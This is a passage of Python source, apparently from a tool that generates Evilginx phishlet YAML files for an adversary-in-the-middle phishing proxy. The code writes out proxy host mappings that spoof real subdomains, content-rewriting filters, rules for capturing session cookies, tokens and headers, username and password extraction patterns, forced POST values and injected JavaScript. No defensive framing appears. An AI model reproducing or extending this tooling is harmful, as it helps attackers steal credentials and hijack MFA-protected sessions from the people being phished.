                p_seq.append(entry)
            doc["params"] = p_seq

        # proxy_hosts (flow-style per item)
        ph_seq = CommentedSeq()
        for host in phishlet.proxy_hosts:
            entry = CommentedMap()
            entry.fa.set_flow_style()
            entry["phish_sub"] = SQ(host.phish_sub)
            entry["orig_sub"] = SQ(host.orig_sub)
            entry["domain"] = SQ(host.domain)
            entry["session"] = host.session
            entry["is_landing"] = host.is_landing
            if not host.auto_filter:
                entry["auto_filter"] = host.auto_filter
            ph_seq.append(entry)
        doc["proxy_hosts"] = ph_seq

        # sub_filters
        if phishlet.sub_filters:
            sf_seq = CommentedSeq()
            for sf in phishlet.sub_filters:
                entry = CommentedMap()
                entry.fa.set_flow_style()
                entry["triggers_on"] = SQ(sf.triggers_on)
                entry["orig_sub"] = SQ(sf.orig_sub)
                entry["domain"] = SQ(sf.domain)
                entry["search"] = SQ(sf.search)
                entry["replace"] = SQ(sf.replace)
                entry["mimes"] = sf.mimes
                if sf.redirect_only:
                    entry["redirect_only"] = sf.redirect_only
                sf_seq.append(entry)
            doc["sub_filters"] = sf_seq

        # auth_tokens
        at_seq = CommentedSeq()
        for at in phishlet.auth_tokens:
            entry = CommentedMap()
            entry["domain"] = SQ(at.domain)
            if isinstance(at, AuthTokenCookie):
                entry["keys"] = [SQ(k) for k in at.keys]
            elif isinstance(at, AuthTokenBody):
                entry["path"] = SQ(at.path)
                entry["name"] = SQ(at.name)
                entry["search"] = SQ(at.search)
            elif isinstance(at, AuthTokenHeader):
                entry["path"] = SQ(at.path)
                entry["name"] = SQ(at.name)
                entry["header"] = SQ(at.header)
            at_seq.append(entry)
        doc["auth_tokens"] = at_seq

        # credentials
        creds_map = CommentedMap()
        if phishlet.credentials.username:
            u = CommentedMap()
            u["key"] = SQ(phishlet.credentials.username.key)
            u["search"] = SQ(phishlet.credentials.username.search)
            u["type"] = SQ(phishlet.credentials.username.type)
            creds_map["username"] = u
        if phishlet.credentials.password:
            p = CommentedMap()
            p["key"] = SQ(phishlet.credentials.password.key)
            p["search"] = SQ(phishlet.credentials.password.search)
            p["type"] = SQ(phishlet.credentials.password.type)
            creds_map["password"] = p
        if phishlet.credentials.custom:
            c_seq = CommentedSeq()
            for c in phishlet.credentials.custom:
                ce = CommentedMap()
                ce["key"] = SQ(c.key)
                ce["search"] = SQ(c.search)
                ce["type"] = SQ(c.type)
                c_seq.append(ce)
            creds_map["custom"] = c_seq
        doc["credentials"] = creds_map

        # auth_urls
        if phishlet.auth_urls:
            doc["auth_urls"] = [SQ(u) for u in phishlet.auth_urls]

        # login
        login_map = CommentedMap()
        login_map["domain"] = SQ(phishlet.login.domain)
        login_map["path"] = SQ(phishlet.login.path)
        doc["login"] = login_map

        # force_post (ALWAYS includes 'force' field)
        if phishlet.force_post:
            fp_seq = CommentedSeq()
            for fp in phishlet.force_post:
                entry = CommentedMap()
                entry["path"] = SQ(fp.path)
                search_seq = CommentedSeq()
                for s in fp.search:
                    s_entry = CommentedMap()
                    s_entry.fa.set_flow_style()
                    s_entry["key"] = SQ(s.key)
                    s_entry["search"] = SQ(s.search)
                    search_seq.append(s_entry)
                entry["search"] = search_seq
                # 'force' field — always present, required by Evilginx
                force_seq = CommentedSeq()
                for f in fp.force:
                    f_entry = CommentedMap()
                    f_entry.fa.set_flow_style()
                    f_entry["key"] = SQ(f.key)
                    f_entry["value"] = SQ(f.value)
                    force_seq.append(f_entry)
                entry["force"] = force_seq
                entry["type"] = SQ(fp.type)
                fp_seq.append(entry)
            doc["force_post"] = fp_seq

        # js_inject
        if phishlet.js_inject:
            ji_seq = CommentedSeq()
            for ji in phishlet.js_inject:
                entry = CommentedMap()
                entry["trigger_domains"] = [SQ(d) for d in ji.trigger_domains]
                entry["trigger_paths"] = [SQ(p) for p in ji.trigger_paths]
                entry["trigger_params"] = ji.trigger_params
                entry["script"] = ji.script
                ji_seq.append(entry)
            doc["js_inject"] = ji_seq

        # redirect_url
        if phishlet.redirect_url:
            doc["redirect_url"] = SQ(phishlet.redirect_url)

        stream = StringIO()
        yaml.dump(doc, stream)
        return stream.getvalue()

    # ──────────────────────────────────────────────────────────────────────
    # Helpers
    # ──────────────────────────────────────────────────────────────────────

    @staticmethod
    def _extract_base_domain(hostname: str) -> str:
        hostname = hostname.split(":")[0]
        parts = hostname.split(".")
        if len(parts) <= 2:
            return hostname
        known_two_part = [
            "co.uk", "com.br", "com.au", "co.jp", "co.kr",
            "org.uk", "net.au", "okta.com", "oktapreview.com",
        ]
        suffix = ".".join(parts[-2:])
        if suffix in known_two_part:
            return ".".join(parts[-3:])
        return ".".join(parts[-2:])
